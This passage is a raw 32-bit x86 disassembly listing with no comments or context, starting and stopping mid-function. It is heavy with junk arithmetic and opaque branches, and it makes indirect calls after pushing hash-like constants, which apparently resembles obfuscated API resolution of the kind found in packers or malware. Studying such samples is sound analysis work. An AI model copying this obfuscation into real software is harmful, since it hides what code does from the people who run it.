  452b44:	mov    esi,DWORD PTR [ebp-0x1c]
  452b47:	add    esi,edx
  452b49:	cmp    esi,0x6d
  452b4c:	jne    0x452bee
  452b52:	and    edi,eax
  452b54:	add    esi,ebx
  452b56:	cmp    esi,DWORD PTR [ebp-0x3c]
  452b59:	je     0x452bee
  452b5f:	add    esi,esi
  452b61:	cmp    esi,0xb94
  452b67:	je     0x452bee
  452b6d:	and    DWORD PTR [ebp-0x1c],esi
  452b70:	and    edi,eax
  452b72:	and    edi,ecx
  452b74:	mov    ecx,eax
  452b76:	mov    esi,eax
  452b78:	sub    DWORD PTR [ebp-0x24],ecx
  452b7b:	sub    esi,ebx
  452b7d:	add    edi,esi
  452b7f:	add    DWORD PTR [ebp-0x24],eax
  452b82:	add    edi,ecx
  452b84:	cmp    edi,ebx
  452b86:	jne    0x452bee
  452b88:	mov    esi,DWORD PTR [ebp-0x14]
  452b8b:	sub    edi,eax
  452b8d:	add    DWORD PTR [ebp-0x1c],edi
  452b90:	xor    edx,edx
  452b92:	add    esi,eax
  452b94:	cmp    esi,0x78
  452b97:	je     0x452bee
  452b99:	mov    ebx,DWORD PTR [ebp-0x1c]
  452b9c:	cmp    eax,0xffffffca
  452b9f:	je     0x452bee
  452ba1:	cmp    esi,0xfffffffb
  452ba4:	je     0x452bee
  452ba6:	sub    DWORD PTR [ebp-0x14],edx
  452ba9:	add    DWORD PTR [ebp-0x18],esi
  452bac:	xor    eax,eax
  452bae:	mov    edx,0x78
  452bb3:	sub    DWORD PTR [ebp-0x24],edx
  452bb6:	sub    eax,ecx
  452bb8:	cmp    eax,ecx
  452bba:	jne    0x452bee
  452bbc:	mov    edx,eax
  452bbe:	sub    ebx,edx
  452bc0:	and    ebx,ecx
  452bc2:	mov    edx,0xb3
  452bc7:	add    DWORD PTR [ebp-0x24],ebx
  452bca:	sub    edx,eax
  452bcc:	cmp    edx,0x42
  452bcf:	jne    0x452bee
  452bd1:	cmp    edx,0x441d
  452bd7:	jne    0x452bee
  452bd9:	or     edx,edi
  452bdb:	test   edx,0x32
  452be1:	je     0x452bee
  452be3:	mov    eax,0xa7
  452be8:	xor    DWORD PTR [ebp-0x24],eax
  452beb:	add    DWORD PTR [ebp-0x14],edx
  452bee:	mov    ecx,edx
  452bf0:	and    ecx,ebx
  452bf2:	cmp    ebx,DWORD PTR [ebp-0x1c]
  452bf5:	je     0x452c46
  452bf7:	sub    ecx,esi
  452bf9:	mov    eax,0xdc
  452bfe:	mov    ebx,eax
  452c00:	add    ebx,edx
  452c02:	or     DWORD PTR [ebp-0x1c],ecx
  452c05:	cmp    ebx,DWORD PTR [ebp-0x30]
  452c08:	je     0x452c46
  452c0a:	mov    esi,DWORD PTR [ebp-0x18]
  452c0d:	sub    ebx,ecx
  452c0f:	mov    edx,DWORD PTR [ebp-0x24]
  452c12:	cmp    esi,0xffffffc9
  452c15:	je     0x452c46
  452c17:	add    DWORD PTR [ebp-0x24],ebx
  452c1a:	mov    eax,DWORD PTR ds:0x471d24
  452c20:	add    edx,edi
  452c22:	cmp    edx,0x4f
  452c25:	jne    0x452c46
  452c27:	add    DWORD PTR [ebp-0x24],eax
  452c2a:	or     edx,esi
  452c2c:	mov    ebx,DWORD PTR [ebp-0x14]
  452c2f:	mov    eax,0x805f
  452c34:	add    DWORD PTR [ebp-0x1c],esi
  452c37:	cmp    ebx,ecx
  452c39:	je     0x452c46
  452c3b:	sub    ebx,edi
  452c3d:	mov    DWORD PTR [ebp-0x18],ebx
  452c40:	mov    DWORD PTR [ebp-0x18],edx
  452c43:	xor    DWORD PTR [ebp-0x14],eax
  452c46:	mov    edi,DWORD PTR [ebp-0x18]
  452c49:	mov    ecx,0x413b
  452c4e:	cmp    edi,ecx
  452c50:	je     0x452d87
  452c56:	add    DWORD PTR [ebp-0x14],eax
  452c59:	or     edi,esi
  452c5b:	xor    DWORD PTR [ebp-0x18],edi
  452c5e:	sub    DWORD PTR [ebp-0x1c],edi
  452c61:	add    DWORD PTR [ebp-0x18],ebx
  452c64:	sub    DWORD PTR [ebp-0x14],eax
  452c67:	sub    ecx,ebx
  452c69:	mov    ebx,0x26
  452c6e:	mov    edx,DWORD PTR [ebp-0x1c]
  452c71:	cmp    edx,DWORD PTR [ebp-0x3c]
  452c74:	jne    0x452d87
  452c7a:	add    DWORD PTR [ebp-0x18],ebx
  452c7d:	mov    ebx,eax
  452c7f:	mov    edi,DWORD PTR [ebp-0x24]
  452c82:	sub    edi,ebx
  452c84:	cmp    edi,ebx
  452c86:	jne    0x452d87
  452c8c:	cmp    esi,edi
  452c8e:	je     0x452d87
  452c94:	mov    eax,DWORD PTR [ebp-0x24]
  452c97:	cmp    ecx,DWORD PTR [ebp-0x34]
  452c9a:	jne    0x452d87
  452ca0:	mov    ebx,0x4a93
  452ca5:	mov    esi,0x96
  452caa:	xor    DWORD PTR [ebp-0x1c],ecx
  452cad:	cmp    edx,DWORD PTR ds:0x471d98
  452cb3:	jne    0x452d87
  452cb9:	and    edi,esi
  452cbb:	mov    ecx,DWORD PTR [ebp-0x18]
  452cbe:	sub    DWORD PTR [ebp-0x18],ebx
  452cc1:	sub    DWORD PTR [ebp-0x1c],eax
  452cc4:	mov    eax,DWORD PTR [ebp-0x18]
  452cc7:	add    eax,ebx
  452cc9:	sub    eax,ebx
  452ccb:	and    edi,edx
  452ccd:	cmp    ecx,0x1279
  452cd3:	jne    0x452d87
  452cd9:	xor    DWORD PTR [ebp-0x18],eax
  452cdc:	cmp    ecx,DWORD PTR [ebp-0x1c]
  452cdf:	jne    0x452d87
  452ce5:	mov    eax,DWORD PTR [ebp-0x24]
  452ce8:	mov    ebx,DWORD PTR [ebp-0x24]
  452ceb:	add    DWORD PTR [ebp-0x14],edi
  452cee:	test   ecx,0xf9
  452cf4:	jne    0x452d87
  452cfa:	mov    edi,eax
  452cfc:	sub    ebx,esi
  452cfe:	add    ebx,edx
  452d00:	sub    DWORD PTR [ebp-0x18],ebx
  452d03:	add    DWORD PTR [ebp-0x14],eax
  452d06:	mov    ebx,DWORD PTR [ebp-0x14]
  452d09:	cmp    ecx,DWORD PTR ds:0x471cec
  452d0f:	jne    0x452d87
  452d11:	mov    edx,DWORD PTR [ebp-0x24]
  452d14:	mov    esi,edi
  452d16:	cmp    edx,DWORD PTR ds:0x471d98
  452d1c:	je     0x452d87
  452d1e:	xor    edi,edi
  452d20:	cmp    esi,ebx
  452d22:	jne    0x452d87
  452d24:	cmp    edx,0x301ac42
  452d2a:	jne    0x452d87
  452d2c:	add    DWORD PTR [ebp-0x1c],ebx
  452d2f:	or     DWORD PTR [ebp-0x1c],edx
  452d32:	mov    edx,DWORD PTR [ebp-0x1c]
  452d35:	sub    DWORD PTR [ebp-0x18],ecx
  452d38:	and    esi,ebx
  452d3a:	add    edx,ebx
  452d3c:	cmp    edx,0x4425
  452d42:	jne    0x452d87
  452d44:	cmp    esi,0xffffffe4
  452d47:	jne    0x452d87
  452d49:	mov    ecx,0x4769
  452d4e:	sub    esi,eax
  452d50:	cmp    esi,DWORD PTR ds:0x471d98
  452d56:	jne    0x452d87
  452d58:	sub    DWORD PTR [ebp-0x1c],esi
  452d5b:	mov    eax,0x75
  452d60:	mov    DWORD PTR [ebp-0x24],eax
  452d63:	sub    edx,esi
  452d65:	mov    ebx,0xcdc4
  452d6a:	add    ecx,edi
  452d6c:	add    DWORD PTR [ebp-0x14],edx
  452d6f:	cmp    esi,0x45
  452d72:	je     0x452d84
  452d74:	mov    edi,esi
  452d76:	add    edi,ebx
  452d78:	or     DWORD PTR [ebp-0x24],eax
  452d7b:	mov    esi,DWORD PTR [ebp-0x24]
  452d7e:	add    DWORD PTR [ebp-0x1c],esi
  452d81:	mov    DWORD PTR [ebp-0x1c],edi
  452d84:	add    DWORD PTR [ebp-0x1c],ecx
  452d87:	lea    edi,[ebp-0x28]
  452d8a:	sub    ecx,ebx
  452d8c:	or     ecx,edi
  452d8e:	add    DWORD PTR [ebp-0x14],ecx
  452d91:	sub    DWORD PTR [ebp-0x24],edx
  452d94:	push   edi
  452d95:	mov    esi,0x47
  452d9a:	mov    eax,DWORD PTR [ebp-0x14]
  452d9d:	add    DWORD PTR [ebp-0x24],esi
  452da0:	or     eax,esi
  452da2:	cmp    edi,DWORD PTR ds:0x471d90
  452da8:	je     0x452db4
  452daa:	test   eax,0x51
  452daf:	jne    0x452db4
  452db1:	add    DWORD PTR [ebp-0x18],eax
  452db4:	push   0x62f8296f
  452db9:	sub    DWORD PTR [ebp-0x24],edi
  452dbc:	add    edi,edx
  452dbe:	mov    edx,DWORD PTR [ebp-0x18]
  452dc1:	mov    ecx,DWORD PTR [ebp-0x1c]
  452dc4:	sub    DWORD PTR [ebp-0x18],edx
  452dc7:	cmp    edi,0xfffffff6
  452dca:	je     0x452ddc
  452dcc:	add    DWORD PTR [ebp-0x18],ecx
  452dcf:	xor    ebx,ebx
  452dd1:	xor    DWORD PTR [ebp-0x14],edi
  452dd4:	xor    eax,eax
  452dd6:	mov    DWORD PTR [ebp-0x40],ebx
  452dd9:	add    DWORD PTR [ebp-0x24],eax
  452ddc:	call   0x4531e8
  452de1:	sub    edi,eax
  452de3:	mov    eax,0xd8
  452de8:	and    edi,esi
  452dea:	mov    ecx,DWORD PTR ds:0x471d7c
  452df0:	sub    DWORD PTR [ebp-0x14],edi
  452df3:	and    eax,ebx
  452df5:	sub    DWORD PTR [ebp-0x14],eax
  452df8:	or     DWORD PTR [ebp-0x24],ecx
  452dfb:	mov    ebx,DWORD PTR [ebp-0x28]
  452dfe:	mov    DWORD PTR [ebp-0x1c],ebx
  452e01:	shr    ebx,0x10
  452e04:	add    edi,esi
  452e06:	sub    DWORD PTR [ebp-0x14],ebx
  452e09:	cmp    edi,0xffffffd1
  452e0c:	je     0x452f52
  452e12:	mov    eax,ebx
  452e14:	mov    ecx,DWORD PTR [ebp-0x18]
  452e17:	and    eax,ebx
  452e19:	cmp    eax,ecx
  452e1b:	jne    0x452f52
  452e21:	add    DWORD PTR [ebp-0x14],ebx
  452e24:	mov    esi,DWORD PTR [ebp-0x18]
  452e27:	xor    edx,edx
  452e29:	mov    DWORD PTR [ebp-0x1c],edi
  452e2c:	cmp    esi,edi
  452e2e:	jne    0x452f52
  452e34:	sub    eax,esi
  452e36:	cmp    ecx,DWORD PTR [ebp-0x2c]
  452e39:	je     0x452f52
  452e3f:	add    eax,eax
  452e41:	sub    eax,edi
  452e43:	add    DWORD PTR [ebp-0x1c],eax
  452e46:	and    ecx,edi
  452e48:	mov    edx,DWORD PTR [ebp-0x24]
  452e4b:	sub    DWORD PTR [ebp-0x14],ecx
  452e4e:	mov    esi,0x1f
  452e53:	cmp    edi,DWORD PTR [ebp-0x20]
  452e56:	je     0x452f52
  452e5c:	mov    eax,DWORD PTR [ebp-0x14]
  452e5f:	and    DWORD PTR [ebp-0x1c],edx
  452e62:	add    eax,edi
  452e64:	xor    edx,edx
  452e66:	cmp    eax,0x1180004d
  452e6b:	je     0x452f52
  452e71:	mov    esi,DWORD PTR [ebp-0x24]
  452e74:	mov    ecx,DWORD PTR [ebp-0x24]
  452e77:	cmp    esi,edi
  452e79:	jne    0x452f52
  452e7f:	add    eax,ebx
  452e81:	sub    DWORD PTR [ebp-0x24],eax
  452e84:	mov    edx,DWORD PTR ds:0x471cf8
  452e8a:	mov    edi,DWORD PTR ds:0x471d08
  452e90:	sub    ecx,edi
  452e92:	cmp    ecx,0x64
  452e95:	jne    0x452f52
  452e9b:	add    ecx,ecx
  452e9d:	add    DWORD PTR [ebp-0x24],ecx
  452ea0:	mov    edi,DWORD PTR [ebp-0x18]
  452ea3:	or     DWORD PTR [ebp-0x18],edi
  452ea6:	xor    edx,edx
  452ea8:	sub    esi,ebx
  452eaa:	xor    DWORD PTR [ebp-0x18],esi
  452ead:	add    DWORD PTR [ebp-0x18],eax
  452eb0:	add    edx,ecx
  452eb2:	cmp    edx,DWORD PTR [ebp-0x18]
  452eb5:	jne    0x452f52
  452ebb:	test   edx,0x32ac
  452ec1:	je     0x452f52
  452ec7:	mov    esi,DWORD PTR [ebp-0x18]
  452eca:	mov    edi,eax
  452ecc:	cmp    edx,DWORD PTR ds:0x471cec
  452ed2:	je     0x452f52
  452ed4:	mov    eax,esi
  452ed6:	add    DWORD PTR [ebp-0x24],edi
  452ed9:	mov    edi,0x1e
  452ede:	sub    DWORD PTR [ebp-0x24],edi
  452ee1:	cmp    eax,0xc07d
  452ee6:	je     0x452f52
  452ee8:	mov    esi,0x41010016
  452eed:	and    esi,eax
  452eef:	mov    edi,0x92
  452ef4:	sub    DWORD PTR [ebp-0x24],edx
  452ef7:	sub    DWORD PTR [ebp-0x14],ebx
  452efa:	cmp    esi,DWORD PTR ds:0x471cec
  452f00:	jne    0x452f52
  452f02:	or     DWORD PTR [ebp-0x1c],edi
  452f05:	mov    edx,DWORD PTR [ebp-0x18]
  452f08:	sub    edx,edi
  452f0a:	add    DWORD PTR [ebp-0x18],esi
  452f0d:	mov    eax,DWORD PTR [ebp-0x14]
  452f10:	sub    DWORD PTR [ebp-0x14],edx
  452f13:	cmp    ecx,ebx
  452f15:	jne    0x452f52
  452f17:	sub    eax,edi
  452f19:	mov    ecx,DWORD PTR [ebp-0x14]
  452f1c:	or     ecx,edx
  452f1e:	cmp    esi,DWORD PTR ds:0x471ce8
  452f24:	jne    0x452f52
  452f26:	mov    esi,0x6d
  452f2b:	mov    edi,DWORD PTR [ebp-0x14]
  452f2e:	add    DWORD PTR [ebp-0x18],esi
  452f31:	cmp    edi,0xfc88
  452f37:	jne    0x452f52
  452f39:	cmp    ebx,0x11100905
  452f3f:	je     0x452f52
  452f41:	add    ecx,edi
  452f43:	cmp    eax,DWORD PTR [ebp-0x20]
  452f46:	je     0x452f52
  452f48:	xor    edx,edx
  452f4a:	or     eax,edx
  452f4c:	sub    DWORD PTR [ebp-0x18],ecx
  452f4f:	add    DWORD PTR [ebp-0x1c],eax
  452f52:	cmp    ebx,0x92df
  452f58:	jne    0x4530d6
  452f5e:	xor    edi,edi
  452f60:	mov    edx,DWORD PTR [ebp-0x24]
  452f63:	cmp    edx,0x41
  452f66:	jne    0x452fd8
  452f68:	mov    eax,DWORD PTR ds:0x471ce4
  452f6e:	mov    ebx,0x201f
  452f73:	add    DWORD PTR [ebp-0x24],ebx
  452f76:	add    edx,edi
  452f78:	add    eax,edx
  452f7a:	add    eax,edx
  452f7c:	or     eax,edi
  452f7e:	test   eax,0x48
  452f83:	jne    0x452fd8
  452f85:	cmp    eax,0xffffffcb
  452f88:	jne    0x452fd8
  452f8a:	add    eax,esi
  452f8c:	mov    edi,DWORD PTR [ebp-0x1c]
  452f8f:	mov    ecx,DWORD PTR [ebp-0x18]
  452f92:	add    DWORD PTR [ebp-0x1c],ecx
  452f95:	cmp    edi,0xfa6b
  452f9b:	jne    0x452fd8
  452f9d:	cmp    edi,0xfffffffd
  452fa0:	jne    0x452fd8
  452fa2:	mov    ecx,DWORD PTR [ebp-0x14]
  452fa5:	cmp    eax,DWORD PTR ds:0x471cb8
  452fab:	jne    0x452fd8
  452fad:	mov    ebx,0x1b
  452fb2:	mov    esi,ebx
  452fb4:	add    ecx,esi
  452fb6:	test   edi,0x5b
  452fbc:	jne    0x452fd8
  452fbe:	mov    edx,DWORD PTR [ebp-0x14]
  452fc1:	add    DWORD PTR [ebp-0x1c],ebx
  452fc4:	or     DWORD PTR [ebp-0x14],edi
  452fc7:	sub    DWORD PTR [ebp-0x18],edx
  452fca:	sub    ecx,esi
  452fcc:	sub    DWORD PTR [ebp-0x14],eax
  452fcf:	mov    edx,DWORD PTR [ebp-0x24]
  452fd2:	add    DWORD PTR [ebp-0x24],edx
  452fd5:	add    DWORD PTR [ebp-0x1c],ecx
  452fd8:	mov    esi,0x9324b280
  452fdd:	sub    DWORD PTR [ebp-0x18],esi
  452fe0:	sub    esi,DWORD PTR [ebp-0x28]
  452fe3:	mov    edx,DWORD PTR ds:0x471cc0
  452fe9:	mov    ecx,eax
  452feb:	sub    DWORD PTR [ebp-0x18],edx
  452fee:	or     ecx,ebx
  452ff0:	add    DWORD PTR [ebp-0x1c],esi
  452ff3:	cmp    ecx,0xffffffbe
  452ff6:	jne    0x45300e
  452ff8:	test   ecx,0x11
  452ffe:	je     0x45300e
  453000:	mov    edi,esi
  453002:	sub    edi,esi
  453004:	mov    ebx,DWORD PTR [ebp-0x18]
  453007:	and    ecx,edi
  453009:	add    ebx,ecx
  45300b:	sub    DWORD PTR [ebp-0x1c],ebx
  45300e:	call   esi
  453010:	test   ebx,0xdb
  453016:	je     0x453029
  453018:	sub    ebx,edi
  45301a:	mov    edx,edi
  45301c:	sub    DWORD PTR [ebp-0x14],edx
  45301f:	xor    esi,esi
  453021:	sub    DWORD PTR [ebp-0x18],ebx
  453024:	add    esi,edi
  453026:	sub    DWORD PTR [ebp-0x1c],esi
  453029:	mov    DWORD PTR [ebp-0x8],eax
  45302c:	mov    ebx,0x11
  453031:	add    ebx,edi
  453033:	cmp    ebx,DWORD PTR ds:0x471d98
  453039:	je     0x453044
  45303b:	or     ebx,eax
  45303d:	cmp    ebx,eax
  45303f:	je     0x453044
  453041:	sub    DWORD PTR [ebp-0x1c],ebx
  453044:	mov    ecx,0x453e15
  453049:	cmp    eax,DWORD PTR ds:0x471cc0
  45304f:	jne    0x453074
  453051:	and    ebx,eax
  453053:	sub    ebx,edx
  453055:	mov    edx,DWORD PTR ds:0x471d6c
  45305b:	or     DWORD PTR [ebp-0x18],ecx
  45305e:	sub    DWORD PTR [ebp-0x14],ebx
  453061:	add    edx,esi
  453063:	mov    ebx,0xb6
  453068:	sub    edx,esi
  45306a:	cmp    esi,edi
  45306c:	jne    0x453074
  45306e:	add    DWORD PTR [ebp-0x14],edx
  453071:	add    DWORD PTR [ebp-0x24],ebx
  453074:	push   DWORD PTR [ebp-0x28]
  453077:	push   0x92e0df84
  45307c:	push   DWORD PTR [ebp-0x8]
  45307f:	call   ecx
  453081:	mov    esi,ebx
  453083:	add    esi,eax
  453085:	sub    DWORD PTR [ebp-0x14],edi
  453088:	mov    eax,DWORD PTR ds:0x471ce8
  45308e:	cmp    esi,0xffffffb6
  453091:	jne    0x4530ab
  453093:	mov    edi,0x4e
  453098:	add    DWORD PTR [ebp-0x18],edi
  45309b:	cmp    esi,edi
  45309d:	je     0x4530ab
  45309f:	or     eax,edi
  4530a1:	sub    DWORD PTR [ebp-0x18],esi
  4530a4:	or     esi,eax
  4530a6:	and    esi,eax
  4530a8:	add    DWORD PTR [ebp-0x18],esi
  4530ab:	add    DWORD PTR [ebp-0x8],0x2d
  4530b2:	mov    esi,0x5abe
  4530b7:	add    DWORD PTR [ebp-0x14],edi
  4530ba:	mov    edx,DWORD PTR ds:0x471d1c
  4530c0:	add    esi,edx
  4530c2:	or     DWORD PTR [ebp-0x14],esi
  4530c5:	mov    edx,DWORD PTR [ebp-0x8]
  4530c8:	add    DWORD PTR [ebp-0x14],edx
  4530cb:	call   edx
  4530cd:	add    DWORD PTR [ebp-0x1c],edi
  4530d0:	sub    DWORD PTR [ebp-0x14],esi
  4530d3:	add    DWORD PTR [ebp-0x1c],esi
  4530d6:	and    eax,ecx
  4530d8:	test   eax,0x42
  4530dd:	jne    0x453114
  4530df:	sub    DWORD PTR [ebp-0x1c],ecx
  4530e2:	mov    esi,DWORD PTR [ebp-0x1c]
  4530e5:	mov    ecx,DWORD PTR ds:0x471cf0
  4530eb:	and    esi,ecx
  4530ed:	add    DWORD PTR [ebp-0x18],eax
  4530f0:	add    esi,ecx
  4530f2:	add    esi,eax
  4530f4:	cmp    esi,0x29
  4530f7:	jne    0x453114
  4530f9:	mov    ecx,DWORD PTR ds:0x471cc8
  4530ff:	add    DWORD PTR [ebp-0x14],ecx
  453102:	mov    edi,edx
  453104:	add    esi,esi
  453106:	cmp    esi,0x9fbd
  45310c:	jne    0x453111
  45310e:	mov    DWORD PTR [ebp-0x18],esi
  453111:	add    DWORD PTR [ebp-0x1c],edi
  453114:	mov    ecx,DWORD PTR [ebp-0x24]
  453117:	add    ecx,eax
  453119:	cmp    ecx,0x855f
  45311f:	je     0x4531b4
  453125:	mov    ebx,DWORD PTR [ebp-0x1c]
  453128:	and    ebx,eax
  45312a:	sub    ebx,esi
  45312c:	mov    eax,0xf0
  453131:	sub    ebx,edi
  453133:	add    DWORD PTR [ebp-0x1c],eax
  453136:	add    DWORD PTR [ebp-0x14],ecx
  453139:	and    ebx,eax
  45313b:	sub    ebx,ecx
  45313d:	add    ebx,eax
  45313f:	sub    ebx,edi
  453141:	sub    ebx,edi
  453143:	and    ebx,ecx
  453145:	cmp    ebx,DWORD PTR ds:0x471cd4
  45314b:	jne    0x4531b4
  45314d:	mov    ecx,DWORD PTR [ebp-0x18]
  453150:	cmp    esi,ebx
  453152:	je     0x4531b4
  453154:	add    DWORD PTR [ebp-0x18],edi
  453157:	add    ecx,edi
  453159:	mov    eax,DWORD PTR [ebp-0x1c]
  45315c:	mov    edx,DWORD PTR [ebp-0x1c]
  45315f:	cmp    edx,DWORD PTR ds:0x471d20
  453165:	jne    0x4531b4
  453167:	sub    DWORD PTR [ebp-0x14],ecx
  45316a:	xor    edi,edi
  45316c:	mov    esi,DWORD PTR [ebp-0x24]
  45316f:	add    edx,eax
  453171:	add    edi,esi
  453173:	sub    edx,eax
  453175:	cmp    ebx,DWORD PTR [ebp-0x3c]
  453178:	jne    0x4531b4
  45317a:	cmp    edx,ecx
  45317c:	je     0x4531b4
  45317e:	mov    ecx,DWORD PTR [ebp-0x18]
  453181:	sub    DWORD PTR [ebp-0x18],ecx
  453184:	and    DWORD PTR [ebp-0x18],edx
  453187:	xor    esi,esi
  453189:	add    ebx,ebx
  45318b:	sub    ebx,edx
  45318d:	sub    esi,eax
  45318f:	and    ebx,esi
  453191:	add    DWORD PTR [ebp-0x14],edi
  453194:	cmp    ebx,edx
  453196:	jne    0x4531b4
  453198:	cmp    ebx,0x4e
  45319b:	je     0x4531b4
  45319d:	cmp    ebx,DWORD PTR [ebp-0x18]
  4531a0:	jne    0x4531b4
  4531a2:	mov    ecx,0x2b
  4531a7:	sub    DWORD PTR [ebp-0x24],ecx
  4531aa:	mov    edx,DWORD PTR [ebp-0x24]
  4531ad:	add    edx,ebx
  4531af:	add    edx,esi
  4531b1:	or     DWORD PTR [ebp-0x1c],edx
  4531b4:	sub    edi,esi
  4531b6:	mov    ebx,DWORD PTR [ebp-0x18]
  4531b9:	cmp    ebx,edi
  4531bb:	jne    0x4531cd
  4531bd:	mov    edx,DWORD PTR [ebp-0x18]
  4531c0:	and    DWORD PTR [ebp-0x18],edx
  4531c3:	mov    ecx,ebx
  4531c5:	add    ecx,edx
  4531c7:	add    DWORD PTR [ebp-0x24],ecx
  4531ca:	or     DWORD PTR [ebp-0x14],edi
  4531cd:	pop    edi
  4531ce:	cmp    edi,edx
  4531d0:	je     0x4531d7
  4531d2:	sub    edx,ecx
  4531d4:	add    DWORD PTR [ebp-0x1c],edx
  4531d7:	pop    esi
  4531d8:	add    DWORD PTR [ebp-0x14],esi
  4531db:	pop    ebx
  4531dc:	mov    ecx,edi
  4531de:	sub    DWORD PTR [ebp-0x14],ecx
  4531e1:	leave  
  4531e2:	ret    
  4531e3:	int3   
  4531e4:	int3   
  4531e5:	int3   
  4531e6:	int3   
  4531e7:	int3   
  4531e8:	push   ebp
  4531e9:	mov    ebp,esp
  4531eb:	sub    esp,0x44
  4531ee:	mov    edx,DWORD PTR ds:0x471d14
  4531f4:	mov    eax,edx
  4531f6:	add    eax,edx
  4531f8:	mov    DWORD PTR [ebp-0x20],eax
  4531fb:	push   ebx
  4531fc:	mov    ecx,DWORD PTR [ebp-0x20]
  4531ff:	sub    DWORD PTR [ebp-0x20],ecx
  453202:	push   esi
  453203:	mov    eax,edx
  453205:	sub    eax,edx
  453207:	mov    DWORD PTR [ebp-0x8],eax
  45320a:	push   edi
  45320b:	mov    edi,DWORD PTR [ebp-0x8]
  45320e:	and    edi,edx
  453210:	mov    ecx,0x6e
  453215:	sub    edi,ecx
  453217:	and    DWORD PTR [ebp-0x20],edi
  45321a:	mov    ecx,eax
  45321c:	sub    ecx,eax
  45321e:	sub    DWORD PTR [ebp-0x20],edi
  453221:	or     DWORD PTR [ebp-0x8],ecx
  453224:	mov    DWORD PTR [ebp-0x24],0x2c39afce
  45322b:	add    eax,ecx
  45322d:	mov    esi,DWORD PTR [ebp-0x20]
  453230:	add    DWORD PTR [ebp-0x8],ecx
  453233:	add    DWORD PTR [ebp-0x8],esi
  453236:	mov    edi,DWORD PTR [ebp-0x20]
  453239:	add    eax,eax
  45323b:	sub    eax,esi
  45323d:	or     DWORD PTR [ebp-0x8],edx
  453240:	add    edi,edx
  453242:	add    DWORD PTR [ebp-0x20],eax
  453245:	and    edi,ecx
  453247:	sub    DWORD PTR [ebp-0x8],edi
  45324a:	call   0x453ac4
  45324f:	and    esi,eax
  453251:	sub    esi,eax
  453253:	mov    ebx,0xe1
  453258:	add    ebx,eax
  45325a:	mov    edi,0x42
  45325f:	sub    DWORD PTR [ebp-0x20],edi
  453262:	cmp    esi,0x5a
  453265:	je     0x45329f
  453267:	sub    DWORD PTR [ebp-0x20],esi
  45326a:	cmp    ebx,DWORD PTR [ebp-0x1c]
  45326d:	jne    0x45329f
  45326f:	mov    edi,DWORD PTR [ebp-0x20]
  453272:	and    edi,eax
  453274:	xor    esi,esi
  453276:	and    edi,esi
  453278:	cmp    ebx,0xefce
  45327e:	je     0x45329f
  453280:	cmp    ebx,DWORD PTR [ebp-0x2c]
  453283:	je     0x45329f
  453285:	mov    esi,0x74e1
  45328a:	sub    esi,edi
  45328c:	mov    edi,DWORD PTR [ebp-0x20]
  45328f:	add    DWORD PTR [ebp-0x8],ebx
  453292:	add    DWORD PTR [ebp-0x8],esi
  453295:	sub    edi,eax
  453297:	add    DWORD PTR [ebp-0x8],ebx
  45329a:	sub    edi,ebx
  45329c:	mov    DWORD PTR [ebp-0x20],edi
  45329f:	mov    DWORD PTR [ebp-0x18],eax
  4532a2:	or     edi,eax
  4532a4:	sub    edi,eax
  4532a6:	cmp    edi,0x4a83
  4532ac:	jne    0x4532c7
  4532ae:	cmp    esi,DWORD PTR [ebp-0x2c]
  4532b1:	je     0x4532c7
  4532b3:	or     edi,esi
  4532b5:	or     edi,ebx
  4532b7:	or     DWORD PTR [ebp-0x8],esi
  4532ba:	cmp    edi,eax
  4532bc:	je     0x4532c7
  4532be:	mov    ecx,DWORD PTR [ebp-0x20]
  4532c1:	add    DWORD PTR [ebp-0x8],ecx
  4532c4:	mov    DWORD PTR [ebp-0x20],edi
  4532c7:	call   0x453ac4
  4532cc:	mov    ebx,DWORD PTR [ebp-0x8]
  4532cf:	add    ebx,ebx
  4532d1:	mov    esi,DWORD PTR [ebp-0x8]
  4532d4:	cmp    esi,DWORD PTR [ebp-0x10]
  4532d7:	jne    0x45337a
  4532dd:	sub    esi,eax
  4532df:	add    DWORD PTR [ebp-0x20],eax
  4532e2:	mov    ecx,DWORD PTR [ebp-0x8]
  4532e5:	and    esi,eax
  4532e7:	mov    edi,DWORD PTR [ebp-0x20]
  4532ea:	and    DWORD PTR [ebp-0x8],esi
  4532ed:	sub    DWORD PTR [ebp-0x8],ebx
  4532f0:	cmp    ecx,edi
  4532f2:	jne    0x45337a
  4532f8:	cmp    ecx,0x4b
  4532fb:	jne    0x45337a
  4532fd:	mov    ebx,DWORD PTR [ebp-0x8]
  453300:	cmp    ecx,DWORD PTR [ebp-0x10]
  453303:	jne    0x45337a
  453305:	add    ecx,eax
  453307:	mov    esi,DWORD PTR ds:0x471d58
  45330d:	sub    ecx,esi
  45330f:	sub    ebx,ecx
  453311:	cmp    ecx,DWORD PTR [ebp-0x8]
  453314:	jne    0x45337a
  453316:	mov    edx,DWORD PTR [ebp-0x20]
  453319:	mov    ecx,DWORD PTR [ebp-0x20]
  45331c:	cmp    ecx,esi
  45331e:	je     0x45337a
  453320:	xor    DWORD PTR [ebp-0x20],edx
  453323:	mov    edx,DWORD PTR [ebp-0x20]
  453326:	mov    esi,0xb7
  45332b:	cmp    eax,DWORD PTR [ebp-0x2c]
  45332e:	je     0x45337a
  453330:	sub    DWORD PTR [ebp-0x8],esi
  453333:	test   edi,0x2e
  453339:	jne    0x45337a
  45333b:	xor    esi,esi
  45333d:	sub    edi,esi
  45333f:	sub    edi,esi
  453341:	cmp    ecx,DWORD PTR [ebp-0x44]
  453344:	je     0x45337a
  453346:	or     DWORD PTR [ebp-0x8],ebx
  453349:	cmp    ecx,0x24
  45334c:	jne    0x45337a
  45334e:	add    edi,ecx
  453350:	and    edi,esi
  453352:	test   edi,0xa4
  453358:	jne    0x45337a
  45335a:	mov    ecx,DWORD PTR ds:0x471cbc
  453360:	or     DWORD PTR [ebp-0x8],edi
  453363:	mov    ebx,DWORD PTR [ebp-0x20]
  453366:	sub    DWORD PTR [ebp-0x20],ebx
  453369:	sub    ecx,edi
  45336b:	add    DWORD PTR [ebp-0x20],ecx
  45336e:	add    edx,ebx
  453370:	sub    edx,esi
  453372:	sub    edx,eax
  453374:	sub    DWORD PTR [ebp-0x8],eax
  453377:	add    DWORD PTR [ebp-0x8],edx
  45337a:	mov    DWORD PTR [ebp-0x14],eax
  45337d:	cmp    ecx,DWORD PTR ds:0x471d58
  453383:	jne    0x4533b3
  453385:	mov    edx,0x4f
  45338a:	mov    ebx,0x86
  45338f:	add    edx,ecx
  453391:	add    DWORD PTR [ebp-0x20],eax
  453394:	and    ebx,esi
  453396:	add    ebx,edi
  453398:	cmp    edx,DWORD PTR [ebp-0x40]
  45339b:	je     0x4533b3
  45339d:	xor    eax,eax
  45339f:	add    edx,ecx
